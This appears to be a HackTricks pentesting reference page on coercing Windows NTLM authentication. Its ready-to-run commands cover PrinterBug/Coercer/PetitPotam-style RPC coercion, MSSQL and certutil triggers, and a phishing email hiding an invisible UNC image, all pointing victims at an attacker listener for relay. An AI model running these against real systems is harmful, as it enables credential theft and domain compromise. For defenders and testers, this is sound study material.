# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.

## Abuso do Spooler Service

Se o serviço _**Print Spooler**_ estiver **habilitado,** você pode usar algumas credenciais AD já conhecidas para **solicitar** ao servidor de impressão do Domain Controller uma **atualização** sobre novos trabalhos de impressão e apenas dizer a ele para **enviar a notificação para algum sistema**.\
Observe que, quando a impressora envia a notificação para um sistema arbitrário, ela precisa **se autenticar contra** esse **sistema**. Portanto, um atacante pode fazer com que o serviço _**Print Spooler**_ se autentique contra um sistema arbitrário, e o serviço vai **usar a conta do computador** nessa autenticação.

Nos bastidores, o clássico primitive **PrinterBug** abusa de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** sobre **`\\PIPE\\spoolss`**. O atacante primeiro abre um handle de printer/server e depois fornece um nome de cliente falso em `pszLocalMachine`, fazendo com que o spooler alvo crie um canal de notificação **de volta para o host controlado pelo atacante**. É por isso que o efeito é **coerção de autenticação de saída** em vez de execução direta de código.\
Se você está procurando por **RCE/LPE** no próprio spooler, confira [PrintNightmare](printnightmare.md). Esta página está focada em **coercion and relay**.

### Encontrando Windows Servers no domain

Usando PowerShell, obtenha uma lista de máquinas Windows. Servers geralmente têm prioridade, então vamos focar nisso:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Encontrando serviços Spooler escutando

Usando uma versão ligeiramente modificada do [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) do @mysmartlogin (Vincent Le Toux), veja se o Spooler Service está escutando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Você também pode usar `rpcdump.py` no Linux e procurar pelo protocolo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ou teste rapidamente hosts do Linux com **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Se você quer **enumerar coercion surfaces** em vez de apenas verificar se o endpoint do spooler existe, use **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Isso é útil porque ver o endpoint no EPM só informa que a interface print RPC está registrada. Isso **não** garante que todo método de coerção seja acessível com seus privilégios atuais ou que o host emitirá um fluxo de autenticação utilizável.

### Peça ao serviço para autenticar contra um host arbitrário

Você pode compilar [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se você estiver no Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Com **Coercer**, você pode direcionar diretamente as interfaces do spooler e evitar adivinhar qual método RPC está exposto:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forçar HTTP em vez de SMB com WebClient

O Classic PrinterBug normalmente resulta em uma autenticação **SMB** para `\\attacker\share`, o que ainda é útil para **capture**, **relay para alvos HTTP** ou **relay onde SMB signing está ausente**.\
No entanto, em ambientes modernos, fazer relay de **SMB para SMB** é frequentemente bloqueado por **SMB signing**, então os operadores geralmente preferem forçar a autenticação **HTTP/WebDAV** em vez disso.

Se o alvo tiver o serviço **WebClient** em execução, o listener pode ser especificado em um formato que faz o Windows usar **WebDAV sobre HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Isso é especialmente útil ao encadear com **`ntlmrelayx --adcs`** ou outros alvos de relay HTTP porque evita depender da relayability de SMB na conexão coercionada. A ressalva importante é que **WebClient must be running** na vítima para que a variante HTTP/WebDAV funcione.

### Combinando com Unconstrained Delegation

Se um atacante já comprometeu um computador com [Unconstrained Delegation](unconstrained-delegation.md), o atacante poderia **fazer a impressora autenticar contra este computador**. Devido à unconstrained delegation, o **TGT** da **conta de computador da impressora** será **salvo na** **memory** do computador com unconstrained delegation. Como o atacante já comprometeu esse host, ele poderá **recuperar esse ticket** e abusá-lo ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: interface de impressão assíncrona no mesmo pipe do spooler; use Coercer para enumerar os métodos alcançáveis em um host específico
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (também via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums comumente abusados: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Nota: Esses métodos aceitam parâmetros que podem conter um UNC path (por exemplo, `\\attacker\share`). Quando processado, o Windows autenticará (contexto de machine/user) nesse UNC, permitindo captura ou relay de NetNTLM.\
Para abuso do spooler, **MS-RPRN opnum 65** continua sendo o primitive mais comum e melhor documentado porque a especificação do protocolo afirma explicitamente que o servidor cria um canal de notificação de volta para o cliente especificado por `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN sobre \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: o alvo tenta abrir o backup log path fornecido e autentica para o UNC controlado pelo atacante.
- Practical use: coagir ativos Tier 0 (DC/RODC/Citrix/etc.) a emitir NetNTLM, então fazer relay para endpoints AD CS (cenários ESC8/ESC11) ou outros serviços privilegiados.

## PrivExchange

O ataque `PrivExchange` é resultado de uma falha encontrada no recurso **Exchange Server `PushSubscription`**. Esse recurso permite que o Exchange server seja forçado por qualquer domain user com mailbox a autenticar para qualquer host fornecido pelo cliente via HTTP.

Por padrão, o serviço **Exchange service runs as SYSTEM** e recebe privilégios excessivos (especificamente, ele tem privilégios **WriteDacl no domain pre-2019 Cumulative Update**). Essa falha pode ser explorada para permitir o **relay de informações para LDAP e, subsequentemente, extrair o banco de dados NTDS do domínio**. Nos casos em que o relay para LDAP não é possível, essa falha ainda pode ser usada para relay e autenticação para outros hosts dentro do domínio. A exploração bem-sucedida desse ataque concede acesso imediato ao Domain Admin com qualquer conta de domain user autenticada.

## Inside Windows

Se você já estiver dentro da máquina Windows, você pode forçar o Windows a se conectar a um servidor usando contas privilegiadas com:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou use esta outra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

É possível usar o lolbin certutil.exe (binário assinado pela Microsoft) para coagir autenticação NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Se você souber o **endereço de email** do usuário que faz login em uma máquina que você quer comprometer, você pode simplesmente enviar a ele um **email com uma imagem 1x1** como por exemplo
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
e quando ele o abrir, ele tentará se autenticar.

### MitM

Se você conseguir realizar um ataque MitM em um computador e injetar HTML em uma página que ele visualizar, você poderia tentar injetar uma imagem como a seguinte na página:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Outras maneiras de forçar e fazer phishing de autenticação NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Quebrando NTLMv1

Se você conseguir capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/index.html#ntlmv1-attack).\
_Lembre-se de que, para quebrar NTLMv1, você precisa definir o challenge do Responder para "1122334455667788"_

## Referências
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
